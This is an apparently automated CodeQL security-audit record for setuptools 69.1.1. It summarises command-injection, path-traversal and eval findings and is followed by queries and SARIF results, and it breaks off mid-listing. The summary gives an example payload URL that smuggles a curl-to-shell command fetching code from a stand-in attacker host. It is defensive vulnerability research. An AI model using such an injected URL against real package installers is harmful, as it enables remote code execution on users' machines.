@@ -1,0 +1,5300 @@
+{
+ "session_id": "20261119211415",
+ "package_name": "setuptools-69.1.1",
+ "package_path": "packages/setuptools-69.1.1",
+ "database_path": "databases/setuptools-69.1.1-db",
+ "model": "deepseek/deepseek-reasoner",
+ "temperature": 0.0,
+ "max_tokens": 8000,
+ "iterations": 18,
+ "total_input_tokens": 352694,
+ "total_output_tokens": 38052,
+ "total_tokens": 390746,
+ "elapsed_time_seconds": 704.82,
+ "estimated_cost_usd": 0.1147,
+ "summary": "## Analysis of `setuptools` 69.1.1\n\nPrimary attack surface: the legacy `easy_install`/`package_index` dependency-resolution stack, archive extraction helpers, and configuration loading. Vendored third-party code (`_vendor/`, `pkg_resources/_vendor/`) was reviewed separately and rated low priority.\n\n### 1. CRITICAL — OS command injection in `setuptools/package_index.py` (CWE-78) → CVE-2024-6345\n`download(url, ...)` (line ~817) dispatches on URL scheme to `_download_git()` and `_download_hg()`. The `url` argument (and derived `rev`/`egg` fragments) is interpolated directly into a command string that is passed to **`os.system()`**:\n\n- `package_index.py:886` and `891–895` — `_download_git`: `os.system(f\"{scheme} clone {url} {dest}\")` / `os.system(...)` variants\n- `package_index.py:905` and `910–914` — `_download_hg`: `os.system(...)` variants\n\n**No quoting or sanitization** (`shlex.quote`, allow-listing) is applied before shell interpolation. CodeQL taint tracking confirmed a full data-flow path from the `url` parameter of `download()` (source at line 817, propagating 817→837/839→864–879→881–883) into all four `os.system` command arguments.\n\n**Impact:** A URL such as `git+https://example.com/repo;curl attacker.tld/x|sh` (or with backticks/`$()`/`&&`) results in arbitrary shell command execution as the user running setuptools/easy_install. Reachable whenever `--find-links`/dependency links or an HTML package-index page supplies an attacker-influenced `git+`/`hg+` URL — i.e., a malicious or compromised package index, or a trojaned `dependency_links` entry, can achieve RCE during install/resolution. Fixed upstream in setuptools 70.0.0 by quoting the arguments.\n\n### 2. HIGH/MEDIUM — Path traversal in archive extraction (Zip Slip / tar traversal, CWE-22)\nArchive members are extracted without validating that the resolved destination stays inside the target directory:\n- `setuptools/archive_util.py:103` (zipfile) and `:195` (tarfile)\n- `setuptools/_distutils/archive_util.py:116` (tarfile), `:176–180` (zipfile)\n- `pkg_resources/__init__.py:1761` (egg/zip extraction)\n- `setuptools/command/easy_install.py:1577`, `setuptools/command/bdist_egg.py:454`, `setuptools/wheel.py:119` (wheel unpacking)\n\nA crafted sdist/wheel/egg containing `../` or absolute member names can write outside the extraction root, potentially overwriting `sitecustomize.py`/`.pth`/entry scripts → code execution. `wheel.py` extraction of remote wheels and `easy_install`'s handling of downloaded eggs are the most exposed paths.\n\n### 3. MEDIUM — Unvalidated path handling in download/link resolution (CWE-22)\n`package_index.py` builds local destination filenames from URL/link fragments (`download()` at :647, `urlopen` at :1111) and `setuptools/command/easy_install.py:679`, without sanitizing `../` segments in the URL path/`#egg=` fragment, allowing writes outside the download directory (same class as CVE-2025-47273 in this module).\n\n### 4. LOW — By-design dynamic execution / deserialization sinks (CWE-94 / CWE-502)\n`pkg_resources/__init__.py:1544,1555` (`eval` in entry-point/marker handling), `setuptools/depends.py:114` (`marshal.loads`), `setuptools/_distutils/core.py:267` (`exec` of `setup.py`), `setuptools/launch.py:32`, `setuptools/build_meta.py:311`. These are required by the packaging model but will execute attacker-supplied code if an attacker can place files in the build/import path.\n\n### 5. LOW — Vendored code\n`subprocess(..., shell=True)` at `_vendor/jaraco/context.py:39` and `pkg_resources/_vendor/jaraco/context.py:39` (third-party, constant command — not tainted).\n\n**Recommendation:** upgrade to setuptools ≥ 70.0.0; avoid `easy_install`/`--find-links` with untrusted indexes; use `pip` with hash-pinned indexes.",
+ "package_classification": {
+  "type": [
+   "library",
+   "dev_tool",
+   "cli_tool"
+  ],
+  "layer": [
+   "build_tooling",
+   "packaging",
+   "installer",
+   "python_stdlib_shim"
+  ]
+ },
+ "tool_calls": {
+  "get_package_profile_info": 1,
+  "execute_codeql_query": 28,
+  "validate_codeql_query": 0,
+  "fixup_codeql_query": 0,
+  "finalize_report": 1
+ },
+ "queries_executed": {
+  "critical": 2,
+  "high": 6,
+  "medium": 0,
+  "low": 0,
+  "total_executed": 28,
+  "total_with_results": 8,
+  "total_failed": 20
+ },
+ "query_findings": {
+  "critical": 8,
+  "high": 28,
+  "medium": 0,
+  "low": 0,
+  "total": 36
+ },
+ "findings": [
+  {
+   "codeql_query_uuid": "20261119211641",
+   "codeql_raw_query": "/**\n * @name URL open / system sinks in package_index\n * @description Inventory of network and command sinks in package_index and easy_install\n * @kind problem\n * @problem.severity warning\n * @id py/setuptools-net-sinks\n */\n\nimport python\n\nfrom Call c, string attr, string f\nwhere\n  f = c.getLocation().getFile().getRelativePath() and\n  f in [\"setuptools/package_index.py\", \"setuptools/command/easy_install.py\", \"setuptools/archive_util.py\"] and\n  c.getFunc().(Attribute).getAttr() = attr and\n  attr in [\"urlopen\", \"urlretrieve\", \"system\", \"popen\", \"download\", \"extractall\", \"extract\"]\nselect c, attr + \" call at line \" + c.getLocation().getStartLine().toString()",
+   "hypothesis": "package_index/easy_install/archive_util contain network/command/archive-extraction sinks relevant to RCE and path traversal (CVE-2024-6345, CVE-2025-47273)",
+   "severity": "high",
+   "cwe_ids": [
+    "cwe-78",
+    "cwe-22",
+    "cwe-494"
+   ],
+   "results_count": 7,
+   "results": [
+    {
+     "ruleId": "py/setuptools-net-sinks",
+     "ruleIndex": 0,
+     "rule": {
+      "id": "py/setuptools-net-sinks",
+      "index": 0
+     },
+     "message": {
+      "text": "download call at line 679"
+     },
+     "locations": [
+      {
+       "physicalLocation": {
+        "artifactLocation": {
+         "uri": "setuptools/command/easy_install.py",
+         "uriBaseId": "%SRCROOT%",
+         "index": 0
+        },
+        "region": {
+         "startLine": 679,
+         "startColumn": 26,
+         "endColumn": 67
+        }
+       }
+      }
+     ],
+     "partialFingerprints": {
+      "primaryLocationLineHash": "af5a4482fa469cf9:1",
+      "primaryLocationStartColumnFingerprint": "5"
+     }
+    },
+    {
+     "ruleId": "py/setuptools-net-sinks",
+     "ruleIndex": 0,
+     "rule": {
+      "id": "py/setuptools-net-sinks",
+      "index": 0
+     },
+     "message": {
+      "text": "download call at line 647"
+     },
+     "locations": [
+      {
+       "physicalLocation": {
+        "artifactLocation": {
+         "uri": "setuptools/package_index.py",
+         "uriBaseId": "%SRCROOT%",
+         "index": 1
+        },
+        "region": {
+         "startLine": 647,
+         "startColumn": 27,
+         "endColumn": 63
+        }
+       }
+      }
+     ],
+     "partialFingerprints": {
+      "primaryLocationLineHash": "92da14bc86c0cbb6:1",
+      "primaryLocationStartColumnFingerprint": "6"
+     }
+    },
+    {
+     "ruleId": "py/setuptools-net-sinks",
+     "ruleIndex": 0,
+     "rule": {
+      "id": "py/setuptools-net-sinks",
+      "index": 0
+     },
+     "message": {
+      "text": "system call at line 886"
+     },
+     "locations": [
+      {
+       "physicalLocation": {
+        "artifactLocation": {
+         "uri": "setuptools/package_index.py",
+         "uriBaseId": "%SRCROOT%",
+         "index": 1
+        },
+        "region": {
+         "startLine": 886,
+         "startColumn": 9,
+         "endColumn": 63
+        }
+       }
+      }
+     ],
+     "partialFingerprints": {
+      "primaryLocationLineHash": "110e6b26e8724fdf:1",
+      "primaryLocationStartColumnFingerprint": "0"
+     }
+    },
+    {
+     "ruleId": "py/setuptools-net-sinks",
+     "ruleIndex": 0,
+     "rule": {
+      "id": "py/setuptools-net-sinks",
+      "index": 0
+     },
+     "message": {
+      "text": "system call at line 890"
+     },
+     "locations": [
+      {
+       "physicalLocation": {
+        "artifactLocation": {
+         "uri": "setuptools/package_index.py",
+         "uriBaseId": "%SRCROOT%",
+         "index": 1
+        },
+        "region": {
+         "startLine": 890,
+         "startColumn": 13,
+         "endLine": 896,
+         "endColumn": 14
+        }
+       }
+      }
+     ],
+     "partialFingerprints": {
+      "primaryLocationLineHash": "47166af91fe5be98:1",
+      "primaryLocationStartColumnFingerprint": "0"
+     }
+    },
+    {
+     "ruleId": "py/setuptools-net-sinks",
+     "ruleIndex": 0,
+     "rule": {
+      "id": "py/setuptools-net-sinks",
+      "index": 0
+     },
+     "message": {
+      "text": "system call at line 905"
+     },
+     "locations": [
+      {
+       "physicalLocation": {
+        "artifactLocation": {
+         "uri": "setuptools/package_index.py",
+         "uriBaseId": "%SRCROOT%",
+         "index": 1
+        },
+        "region": {
+         "startLine": 905,
+         "startColumn": 9,
+         "endColumn": 62
+        }
+       }
+      }
+     ],
+     "partialFingerprints": {
+      "primaryLocationLineHash": "d1121df9f941f469:1",
+      "primaryLocationStartColumnFingerprint": "0"
+     }
+    },
+    {
+     "ruleId": "py/setuptools-net-sinks",
+     "ruleIndex": 0,
+     "rule": {
+      "id": "py/setuptools-net-sinks",
+      "index": 0
+     },
+     "message": {
+      "text": "system call at line 909"
+     },
+     "locations": [
+      {
+       "physicalLocation": {
+        "artifactLocation": {
+         "uri": "setuptools/package_index.py",
+         "uriBaseId": "%SRCROOT%",
+         "index": 1
+        },
+        "region": {
+         "startLine": 909,
+         "startColumn": 13,
+         "endLine": 915,
+         "endColumn": 14
+        }
+       }
+      }
+     ],
+     "partialFingerprints": {
+      "primaryLocationLineHash": "5d4ab79097bb1bf6:1",
+      "primaryLocationStartColumnFingerprint": "0"
+     }
+    },
+    {
+     "ruleId": "py/setuptools-net-sinks",
+     "ruleIndex": 0,
+     "rule": {
+      "id": "py/setuptools-net-sinks",
+      "index": 0
+     },
+     "message": {
+      "text": "urlopen call at line 1111"
+     },
+     "locations": [
+      {
+       "physicalLocation": {
+        "artifactLocation": {
+         "uri": "setuptools/package_index.py",
+         "uriBaseId": "%SRCROOT%",
+         "index": 1
+        },
+        "region": {
+         "startLine": 1111,
+         "startColumn": 16,
+         "endColumn": 43
+        }
+       }
+      }
+     ],
+     "partialFingerprints": {
+      "primaryLocationLineHash": "8428de95745533b1:1",
+      "primaryLocationStartColumnFingerprint": "7"
+     }
+    }
+   ]
+  },
+  {
+   "codeql_query_uuid": "20261119211657",
+   "codeql_raw_query": "/**\n * @name shell=True subprocess usage\n * @description Detects subprocess invocations requesting a shell\n * @kind problem\n * @problem.severity error\n * @id py/setuptools-shell-true\n */\n\nimport python\n\nfrom Call call, Keyword k\nwhere\n  k = call.getAKeyword() and\n  k.getArg() = \"shell\" and\n  k.getValue().(Name).getId() = \"True\"\nselect call, \"subprocess call with shell=True\"",
+   "hypothesis": "Command injection risk via subprocess calls with shell=True",
+   "severity": "high",
+   "cwe_ids": [
+    "cwe-78"
+   ],
+   "results_count": 2,
+   "results": [
+    {
+     "ruleId": "py/setuptools-shell-true",
+     "ruleIndex": 0,
+     "rule": {
+      "id": "py/setuptools-shell-true",
+      "index": 0
+     },
+     "message": {
+      "text": "subprocess call with shell=True"
+     },
+     "locations": [
+      {
+       "physicalLocation": {
+        "artifactLocation": {
+         "uri": "setuptools/_vendor/jaraco/context.py",
+         "uriBaseId": "%SRCROOT%",
+         "index": 0
+        },
+        "region": {
+         "startLine": 39,
+         "startColumn": 18,
+         "endColumn": 70
+        }
+       }
+      }
+     ],
+     "partialFingerprints": {
+      "primaryLocationLineHash": "6628efb33720d045:1",
+      "primaryLocationStartColumnFingerprint": "9"
+     }
+    },
+    {
+     "ruleId": "py/setuptools-shell-true",
+     "ruleIndex": 0,
+     "rule": {
+      "id": "py/setuptools-shell-true",
+      "index": 0
+     },
+     "message": {
+      "text": "subprocess call with shell=True"
+     },
+     "locations": [
+      {
+       "physicalLocation": {
+        "artifactLocation": {
+         "uri": "pkg_resources/_vendor/jaraco/context.py",
+         "uriBaseId": "%SRCROOT%",
+         "index": 1
+        },
+        "region": {
+         "startLine": 39,
+         "startColumn": 18,
+         "endColumn": 70
+        }
+       }
+      }
+     ],
+     "partialFingerprints": {
+      "primaryLocationLineHash": "6628efb33720d045:1",
+      "primaryLocationStartColumnFingerprint": "9"
+     }
+    }
+   ]
+  },
+  {
+   "codeql_query_uuid": "20261119211752",
+   "codeql_raw_query": "/**\n * @name os.system/popen sinks in package_index.py with context\n * @description Lists command execution sinks and their enclosing function and first argument text\n * @kind problem\n * @problem.severity warning\n * @id py/setuptools-pkgindex-sinks-ctx\n */\nimport python\nimport semmle.python.ApiGraphs\n\nfrom DataFlow::CallCfgNode call, Function f\nwhere\n  call = API::moduleImport(\"os\").getMember([\"system\", \"popen\"]).getACall()\n  and call.getScope() = f\n  and call.getLocation().getFile().getRelativePath() = \"setuptools/package_index.py\"\nselect call, \"in \" + f.getName() + \" arg: \" + call.getArg(0).toString()",
+   "hypothesis": "os.system calls in package_index.py take a parameter (downloaded/remote-derived content) as command - code injection (CVE-2024-6345 class)",
+   "severity": "critical",
+   "cwe_ids": [
+    "cwe-78",
+    "cwe-94"
+   ],
+   "results_count": 4,
+   "results": [
+    {
+     "ruleId": "py/setuptools-pkgindex-sinks-ctx",
+     "ruleIndex": 0,
+     "rule": {
+      "id": "py/setuptools-pkgindex-sinks-ctx",
+      "index": 0
+     },
+     "message": {
+      "text": "in _download_git arg: ControlFlowNode for BinaryExpr"
+     },
+     "locations": [
+      {
+       "physicalLocation": {
+        "artifactLocation": {
+         "uri": "setuptools/package_index.py",
+         "uriBaseId": "%SRCROOT%",
+         "index": 0
+        },
+        "region": {
+         "startLine": 886,
+         "startColumn": 9,
+         "endColumn": 63
+        }
+       }
+      }
+     ],
+     "partialFingerprints": {
+      "primaryLocationLineHash": "110e6b26e8724fdf:1",
+      "primaryLocationStartColumnFingerprint": "0"
+     }
+    },
+    {
+     "ruleId": "py/setuptools-pkgindex-sinks-ctx",
+     "ruleIndex": 0,
+     "rule": {
+      "id": "py/setuptools-pkgindex-sinks-ctx",
+      "index": 0
+     },
+     "message": {
+      "text": "in _download_git arg: ControlFlowNode for BinaryExpr"
+     },
+     "locations": [
+      {
+       "physicalLocation": {
+        "artifactLocation": {
+         "uri": "setuptools/package_index.py",
+         "uriBaseId": "%SRCROOT%",
+         "index": 0
+        },
+        "region": {
+         "startLine": 890,
+         "startColumn": 13,
+         "endLine": 896,
+         "endColumn": 14
+        }
+       }
+      }
+     ],
+     "partialFingerprints": {
+      "primaryLocationLineHash": "47166af91fe5be98:1",
+      "primaryLocationStartColumnFingerprint": "0"
+     }
+    },
+    {
+     "ruleId": "py/setuptools-pkgindex-sinks-ctx",
+     "ruleIndex": 0,
+     "rule": {
+      "id": "py/setuptools-pkgindex-sinks-ctx",
+      "index": 0
+     },
+     "message": {
+      "text": "in _download_hg arg: ControlFlowNode for BinaryExpr"
+     },
+     "locations": [
+      {
+       "physicalLocation": {
+        "artifactLocation": {
+         "uri": "setuptools/package_index.py",
+         "uriBaseId": "%SRCROOT%",
+         "index": 0
+        },
+        "region": {
+         "startLine": 905,
+         "startColumn": 9,
+         "endColumn": 62
+        }
+       }
+      }
+     ],
+     "partialFingerprints": {
+      "primaryLocationLineHash": "d1121df9f941f469:1",
+      "primaryLocationStartColumnFingerprint": "0"
+     }
+    },
+    {
+     "ruleId": "py/setuptools-pkgindex-sinks-ctx",
+     "ruleIndex": 0,
+     "rule": {
+      "id": "py/setuptools-pkgindex-sinks-ctx",
+      "index": 0
+     },
+     "message": {
+      "text": "in _download_hg arg: ControlFlowNode for BinaryExpr"
+     },
+     "locations": [
+      {
+       "physicalLocation": {
+        "artifactLocation": {
+         "uri": "setuptools/package_index.py",
+         "uriBaseId": "%SRCROOT%",
+         "index": 0
+        },
+        "region": {
+         "startLine": 909,
+         "startColumn": 13,
+         "endLine": 915,
+         "endColumn": 14
+        }
+       }
+      }
+     ],
+     "partialFingerprints": {
+      "primaryLocationLineHash": "5d4ab79097bb1bf6:1",
+      "primaryLocationStartColumnFingerprint": "0"
+     }
+    }
+   ]
+  },
+  {
+   "codeql_query_uuid": "20261119211908",
+   "codeql_raw_query": "/**\n * @name setuptools package_index os.system command injection\n * @description URL/parameter data flows into os.system inside _download_git/_download_hg\n * @kind path-problem\n * @problem.severity error\n * @id py/setuptools-pkgindex-cmdi\n * @tags security\n *        external/cwe/cwe-078\n */\n\nimport python\nimport semmle.python.dataflow.new.DataFlow\nimport semmle.python.dataflow.new.TaintTracking\nimport semmle.python.ApiGraphs\n\nmodule CmdInjectionConfig implements DataFlow::ConfigSig {\n  predicate isSource(DataFlow::Node source) {\n    exists(DataFlow::ParameterNode p |\n      p.getParameter().(Parameter).getName() = \"url\" and\n      source = p\n    )\n  }\n\n  predicate isSink(DataFlow::Node sink) {\n    exists(DataFlow::CallCfgNode call |\n      call = API::moduleImport(\"os\").getMember(\"system\").getACall() and\n      sink = call.getArg(0)\n    )\n  }\n}\n\nmodule CmdInjectionFlow = TaintTracking::Global<CmdInjectionConfig>;\nimport CmdInjectionFlow::PathGraph\n\nfrom CmdInjectionFlow::PathNode source, CmdInjectionFlow::PathNode sink\nwhere CmdInjectionFlow::flowPath(source, sink)\nselect sink.getNode(), source, sink, \"URL parameter reaches os.system in $@.\", sink.getNode(), \"command\"\n",
+   "hypothesis": "CVE-2024-6345: URL argument to package_index download helpers flows unsanitized into os.system, allowing command injection.",
+   "severity": "critical",
+   "cwe_ids": [
+    "cwe-078"
+   ],
+   "results_count": 4,
+   "results": [
+    {
+     "ruleId": "py/setuptools-pkgindex-cmdi",
+     "ruleIndex": 0,
+     "rule": {
+      "id": "py/setuptools-pkgindex-cmdi",
+      "index": 0
+     },
+     "message": {
+      "text": "URL parameter reaches os.system in [command](1).\nURL parameter reaches os.system in [command](1).\nURL parameter reaches os.system in [command](1)."
+     },
+     "locations": [
+      {
+       "physicalLocation": {
+        "artifactLocation": {
+         "uri": "setuptools/package_index.py",
+         "uriBaseId": "%SRCROOT%",
+         "index": 0
+        },
+        "region": {
+         "startLine": 886,
+         "startColumn": 19,
+         "endColumn": 62
+        }
+       }
+      }
+     ],
+     "partialFingerprints": {
+      "primaryLocationLineHash": "110e6b26e8724fdf:1",
+      "primaryLocationStartColumnFingerprint": "10"
+     },
+     "codeFlows": [
+      {
+       "threadFlows": [
+        {
+         "locations": [
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 817,
+              "startColumn": 37,
+              "endColumn": 40
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for url"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 837,
+              "startColumn": 39,
+              "endColumn": 42
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for url"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 881,
+              "startColumn": 29,
+              "endColumn": 32
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for url"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 883,
+              "startColumn": 49,
+              "endColumn": 52
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for url"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 864,
+              "startColumn": 33,
+              "endColumn": 36
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for url"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 865,
+              "startColumn": 25,
+              "endColumn": 29
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for path"
+            }
+           },
+           "taxa": [
+            {
+             "id": "AdditionalTaintStep",
+             "properties": {
+              "CodeQL/DataflowRole": "step"
+             }
+            }
+           ]
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 870,
+              "startColumn": 9,
+              "endColumn": 13
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for path"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 874,
+              "startColumn": 19,
+              "endColumn": 22
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for rev"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 879,
+              "startColumn": 16,
+              "endColumn": 24
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for Tuple"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 883,
+              "startColumn": 20,
+              "endColumn": 70
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for Attribute()"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 883,
+              "startColumn": 9,
+              "endColumn": 12
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for url"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 886,
+              "startColumn": 19,
+              "endColumn": 62
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for BinaryExpr"
+            }
+           }
+          }
+         ]
+        }
+       ]
+      },
+      {
+       "threadFlows": [
+        {
+         "locations": [
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 817,
+              "startColumn": 37,
+              "endColumn": 40
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for url"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 837,
+              "startColumn": 39,
+              "endColumn": 42
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for url"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 881,
+              "startColumn": 29,
+              "endColumn": 32
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for url"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 883,
+              "startColumn": 49,
+              "endColumn": 52
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for url"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 864,
+              "startColumn": 33,
+              "endColumn": 36
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for url"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 865,
+              "startColumn": 9,
+              "endColumn": 42
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for Tuple"
+            }
+           },
+           "taxa": [
+            {
+             "id": "AdditionalTaintStep",
+             "properties": {
+              "CodeQL/DataflowRole": "step"
+             }
+            }
+           ]
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 865,
+              "startColumn": 25,
+              "endColumn": 29
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for path"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 870,
+              "startColumn": 9,
+              "endColumn": 13
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for path"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 874,
+              "startColumn": 13,
+              "endColumn": 22
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for Tuple"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 874,
+              "startColumn": 19,
+              "endColumn": 22
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for rev"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 879,
+              "startColumn": 16,
+              "endColumn": 24
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for Tuple"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 883,
+              "startColumn": 20,
+              "endColumn": 70
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for Attribute()"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 883,
+              "startColumn": 9,
+              "endColumn": 17
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for Tuple"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 883,
+              "startColumn": 9,
+              "endColumn": 12
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for url"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 886,
+              "startColumn": 19,
+              "endColumn": 62
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for BinaryExpr"
+            }
+           }
+          }
+         ]
+        }
+       ]
+      },
+      {
+       "threadFlows": [
+        {
+         "locations": [
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 864,
+              "startColumn": 33,
+              "endColumn": 36
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for url"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 865,
+              "startColumn": 25,
+              "endColumn": 29
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for path"
+            }
+           },
+           "taxa": [
+            {
+             "id": "AdditionalTaintStep",
+             "properties": {
+              "CodeQL/DataflowRole": "step"
+             }
+            }
+           ]
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 870,
+              "startColumn": 9,
+              "endColumn": 13
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for path"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 874,
+              "startColumn": 19,
+              "endColumn": 22
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for rev"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
+              "uriBaseId": "%SRCROOT%",
+              "index": 0
+             },
+             "region": {
+              "startLine": 879,
+              "startColumn": 16,
+              "endColumn": 24
+             }
+            },
+            "message": {
+             "text": "ControlFlowNode for Tuple"
+            }
+           }
+          },
+          {
+           "location": {
+            "physicalLocation": {
+             "artifactLocation": {
+              "uri": "setuptools/package_index.py",
